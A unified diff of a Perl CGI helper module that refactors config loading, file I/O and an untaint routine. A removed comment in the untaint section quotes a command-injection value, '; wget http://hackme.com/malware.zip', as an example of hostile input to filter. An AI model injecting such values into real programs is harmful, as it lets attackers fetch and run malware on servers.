@@ -12,7 +12,7 @@ package session_lib;
 	     run_session save_session update_cookie
 	     safe_file init_progress_meter progress_meter multi_string 
 	     save_upload_file index_url email exists_message final_message 
-	     read_file write_log write_log2 write_log3 log2file daemon_log
+	     read_file read_file_array write_log write_log2 write_log3 log2file daemon_log
 	     current_view bs_view capture_url exp_time get_bitaccess_value big_mask
 	     happy_recs print_xml blast_qmh_lines make_column_lines seq_line_break_with_htmltags 
 	     get_xml_tag get_all_xml_tag_values session_id dump_hash
@@ -744,6 +744,8 @@ sub busy
 }
 
 
+# check_config(\%cf, "name1,name2,name3");
+
 # Use this to verify that the config we've read has the minimum
 # required values.  usage: check_config(\%cf, "name1,name2,name3");
 # CGI programs must not print to stdout unless they are printing a
@@ -761,17 +763,27 @@ sub busy
 
 sub check_config
 {
-    my %cf = %{$_[0]};
+    my $cf = $_[0];
     my $str = $_[1];
     
+    if (! (ref($cf) eq 'HASH'))
+    {
+        my $msg = sprintf("Expecting a hash reference. Wrong type of 1st arg in %s at line: %s called from file: %s line: %s\n",
+                          __FILE__,
+                          __LINE__,
+                          (caller(0))[1],
+                          (caller(0))[2]);
+        die $msg;
+    }
+
     my @list = split(',', $str);
     foreach my $item (@list)
     {
-	if (!exists($cf{$item}))
+	if (!exists($cf->{$item}))
 	{
 	    my $dot_slash = abs_path("./");
 	    my $output = "$0 error Missing required config: $item\n";
-	    $output .= "app_config:$cf{app_config}\n";
+	    $output .= "app_config:$cf->{app_config}\n";
 	    $output .= "Checking path: $path\nand: $dot_slash\n";
 	    if (exists($ENV{APP_CONFIG}))
 	    {
@@ -788,31 +800,10 @@ sub check_config
 # jul 18 2008 twl8n add : and ~ to the list of approved chars. They seems harmless
 # on the command line, and we need it for urls http://example.com/file.txt
 
-# We don't want user input to be able to include "; wget http://hackme.com/malware.zip"
-
-# jul 28 2012 added = and + so we can process base64 encoding.
-
-# -----BEGIN PUBLIC KEY-----
-# MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC9KEc6J2NmtQUxacZCxVF4deZM
-# moQlmvtJlGnA8bHYldNEB6db7e5lac8apdZq+NQG3lsJntg5yrMj8R5kL/aANV0p
-# 5pzLr7zxo82FoHEeh0lpEe2lFTPQJKvTDAZn3VZve9UrUT6h8+/m3FQ+joVAVXDM
-# Z3Dz2E6mW4I5neEKdwIDAQAB
-# -----END PUBLIC KEY-----
-
-
-
 sub untaint
 {
     my $var = $_[0];
-    my $newline_ok = $_[1];
-    if ($newline_ok)
-    {
-        $var =~ s/[^A-Za-z0-9\.\_\-\/:~=+\s]//g;
-    }
-    else
-    {
-        $var =~ s/[^A-Za-z0-9\.\_\-\/:~=+]//g;
-    }
+    $var =~ s/[^A-Za-z0-9\.\_\-\/:~]//g;
     return $var;
 }
 
@@ -1108,10 +1099,11 @@ sub app_config
     my %cf_hide;
     my $ok_flag = 0;
 
-    # 04 mar 2008 Add a mode where only one "master" .app_config is read.
-    # Up to 5 redirect are always read, if available.
     if (defined($main::ac_check_one) && $main::ac_check_one)
     {
+        # 04 mar 2008 Add a mode where only one "master" .app_config is read, as
+        # opposed to reading each of the available app_config files.  Up to 5
+        # redirects are always read, if available.
 	if (exists($ENV{APP_CONFIG}))
 	{
 	    $ok_flag = check_and_traverse($ENV{APP_CONFIG}, \%cf, \%cf_hide);
@@ -1190,28 +1182,7 @@ sub app_config
 	return %cf;
     }
 }
-sub ct_core
-{
-    my $ac_file = $_[0];
-    my $cf_hr = $_[1];
-    my $cf_hide_hr = $_[2];
-    my $all = read_file($ac_file); 
-    my $ok_flag = 0;
 
-    # save visited file names for debugging.
-    # Get the current working directory, and substitute for ./
-    # at the front of the $ac_file if ./ is there. 
-    
-    my $cwd = `/bin/pwd`;
-    chomp($cwd);
-    $ac_file =~ s/^\.\//$cwd\//;
-    
-    $cf_hr->{app_config} .= "$ac_file, ";
-    
-    ac_core($all, $cf_hr, $cf_hide_hr);
-    $ok_flag = 1;
-    return $ok_flag;
-}
 
 # Called from app_config above.
 # Don't add db logging to any app_config subs because db logging calls app_config.
@@ -1222,49 +1193,32 @@ sub check_and_traverse
     my $cf_hide_hr = $_[2];
     my $ok_flag = 0;
     
-    if (-e $ac_file && -f $ac_file)
+    if (-e $ac_file)
     {
-        # save visited file names for debugging.
-        # Get the current working directory, and substitute for ./
-        # at the front of the $ac_file if ./ is there. 
-        
-        my $cwd = `/bin/pwd`;
-        chomp($cwd);
-        $ac_file =~ s/^\.\//$cwd\//;
-        
-        $cf_hr->{app_config} .= "$ac_file, ";
-        my $all = read_file($ac_file); 
-        ac_core($all, $cf_hr, $cf_hide_hr);
-        $ok_flag = 1;
-    }
-    else
-    {
-        die "Error: app_config can't find: $ac_file\n";
-    }
+	my $all = read_file($ac_file); 
 
+	# save visited file names for debugging.
+	# Get the current working directory, and substitute for ./
+	# at the front of the $ac_file if ./ is there. 
+	my $cwd = `/bin/pwd`;
+	chomp($cwd);
+	$ac_file =~ s/^\.\//$cwd\//;
 
+	$cf_hr->{app_config} .= "$ac_file, ";
+
+	ac_core($all, $cf_hr, $cf_hide_hr);
+	$ok_flag = 1;
+
+    }
     my $xx = 0;
     while ($cf_hr->{redirect} && ($xx < 5))
     {
-        my $all = "";
-        if (-e $cf_hr->{redirect} && -f $cf_hr->{redirect})
-        {
-            $all = read_file($cf_hr->{redirect});
-        }
-        else
-        {
-            die "Error: app_config can't find redirect: $cf_hr->{redirect}\n";
-        }
-
+	my $all = read_file($cf_hr->{redirect});
 	# save visited file names for debugging.
 	$cf_hr->{app_config} .= ", $cf_hr->{redirect}";
 	$cf_hr->{redirect} = "";
 	ac_core($all, $cf_hr, $cf_hide_hr);
 	$xx++;
-    }
-    if ($xx >= 5)
-    {
-        $ok_flag = 0;
     }
     return $ok_flag;
 }
@@ -1279,7 +1233,7 @@ sub check_and_traverse
 # than the alternatives (not shown here). The second regex handles octal
 # character encoding, which is very handy in any template.
 
-# Not exported. Only called from check_and_traverse() and (?) app_config() above.
+# Not exported. Only called from app_config() above.
 # Don't add db logging to any app_config subs because db logging calls app_config.
 
 sub ac_core
@@ -1357,11 +1311,15 @@ sub ac_core
 	    }
 	}
     }
-    
+
+
+
     # Hide needs a copy of the debug info too.
     # Hide does not need, nor does it get a copy of full_text (below).
-    
+
     $cf_hide->{app_config} = $cf_ref->{app_config};
+
+
 
     # Each .app_config can supply a list of options to include in the
     # full_text field. This field's purpose is as record keeping only
@@ -1760,7 +1718,7 @@ sub save_upload_file
     {
 	# Normal text file.
 
-	open (A_OUT,"> $dest_file") || die "Cannot open $dest_file for write.\n";
+	open (A_OUT,">", $dest_file) || die "Cannot open $dest_file for write.\n";
 	my $buffer;
 	while (my $bytesread=read($filehandle,$buffer,1024))
 	{
@@ -1784,7 +1742,7 @@ sub save_upload_file
 	}
 	else
 	{
-	    open (A_OUT,"> $dest_file") || die "Cannot open $dest_file for write.\n";
+	    open (A_OUT,">", $dest_file) || die "Cannot open $dest_file for write.\n";
 	    print A_OUT $buffer; # print (save) first line we read above!
 	    while (my $bytesread=read($filehandle,$buffer,1024))
 	    {
@@ -1797,7 +1755,7 @@ sub save_upload_file
     else
     {
 	# Any other file, usually binary.
-	open (A_OUT,"> $dest_file") || die "Cannot open $dest_file for write.\n";
+	open (A_OUT,">", $dest_file) || die "Cannot open $dest_file for write.\n";
 	my $buffer;
 	my $total_bytes = 0;
 	while (my $bytesread=read($filehandle,$buffer,10240))
@@ -1858,7 +1816,7 @@ sub email
     my $email = readfile("admin_email.html");
     $email =~ s/{(.*?)}/$info{$1}/g;
 
-    open (MAIL, '| /usr/lib/sendmail -t -oi');
+    open (MAIL, '|-', '/usr/lib/sendmail -t -oi');
     print MAIL "$email\n";
     close MAIL;
 }
@@ -1903,7 +1861,7 @@ sub read_file
     # That requires separate args for the < and for the file name.
     # It also works for files with trailing space.
 
-    if (! open(IN, "<", "$_[0]"))
+    if (! open(IN, "<", $_[0]))
     {
 	die "Could not open $_[0] $!\n";
     }
@@ -1912,12 +1870,41 @@ sub read_file
     return $temp;
 }
 
+sub read_file_array
+{
+    my @stat_array = stat($_[0]);
+    if ($#stat_array < 7)
+      {
+        die "read_file: File $_[0] not found\n";
+      }
+    my $temp;
+
+    # It is possible that someone will ask us to open a file with a leading space.
+    # That requires separate args for the < and for the file name.
+    # It also works for files with trailing space.
+
+    my $st;
+    if (! open($st, "<", $_[0]))
+    {
+	die "Could not open $_[0] $!\n";
+    }
+    
+    # Use singular var names. "The line array". There is one one per element,
+    # and the array is named for the type of element.
+    
+    my @line;
+    @line = <$st>;
+    chomp(@line);
+    close(IN);
+    return @line;
+}
+
 
 sub write_log
 {
     my $fn = "./error.txt";
 
-    open(LOG_OUT, ">> $fn") || die "Cannot open log $fn\n";
+    open(LOG_OUT, ">>", $fn) || die "Cannot open log $fn\n";
     print LOG_OUT "$_[0]\n";
     close(LOG_OUT);
     # chmod(0660, $fn);
@@ -1936,7 +1923,7 @@ sub write_log2
 
     my $fn = "$log_dir/error.txt";
 
-    open(LOG_OUT, ">> $fn") || die "Cannot open log $fn\n";
+    open(LOG_OUT, ">>",  $fn) || die "Cannot open log $fn\n";
     print LOG_OUT "$message\n";
     close(LOG_OUT);
     chmod(0660, $fn);
@@ -2309,11 +2296,11 @@ sub dump_hash
     {
 	if (-e "$sarg{logfile}")
 	{
-	    open(LOG,">>$sarg{logfile}") || die "log file open $sarg{logfile} $!";
+	    open(LOG,">>", $sarg{logfile}) || die "log file open $sarg{logfile} $!";
 	}
 	else
 	{
-	    open(LOG,">$sarg{logfile}") || die "log file open $sarg{logfile} $!";
+	    open(LOG,">" , $sarg{logfile}) || die "log file open $sarg{logfile} $!";
 	}
     
 	print LOG "\n.HASH DUMP FOR $sarg{name}\n-----------------------------------------------\n";
